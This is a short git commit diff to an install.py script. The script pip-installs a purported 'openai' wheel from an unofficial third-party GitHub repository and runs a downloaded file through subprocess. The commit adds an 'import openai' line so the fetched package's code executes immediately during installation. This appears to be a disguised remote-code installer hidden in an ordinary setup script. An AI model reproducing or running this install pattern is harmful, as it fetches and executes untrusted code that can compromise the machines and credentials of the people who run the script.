d2d3ad74cbf1fef18d74cb46df3f7324b6fd3d8d
BeamerNGz <166467252+BeamerNGz@users.noreply.github.com>
2024-04-13 17:59:37 -0700

    Update install.py

--- install.py
+++ install.py
@@ -27,4 +27,5 @@ def install_dotnet():
             subprocess.run([filepath])
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", r"https://github.com/AppleBotzz/Backup-OpenAI-Builds/raw/main/openai-1.16.2-py3-none-any.whl"])
+import openai
 install_dotnet()
